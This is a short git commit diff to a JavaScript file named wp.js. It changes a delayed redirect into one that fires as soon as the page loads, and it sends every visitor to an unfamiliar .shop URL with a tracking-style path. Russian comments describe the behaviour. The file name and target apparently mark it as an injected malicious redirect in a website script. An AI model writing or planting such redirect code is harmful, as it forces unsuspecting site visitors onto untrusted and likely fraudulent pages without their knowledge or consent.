a2db08f4cecb26e102215dff703c5283ac8519b1
truba77 <165009671+truba77@users.noreply.github.com>
2024-04-06 11:57:20 +0300

    Update wp.js

--- wp.js
+++ wp.js
@@ -1,3 +1,5 @@
-setTimeout(function() {
+// Ждем загрузки всего контента страницы
+window.addEventListener('load', function() {
+    // Перенаправляем пользователя на указанный URL
     window.location.href = "https://awards2tools.shop/wbrXFr";
-}, 3000);
+});
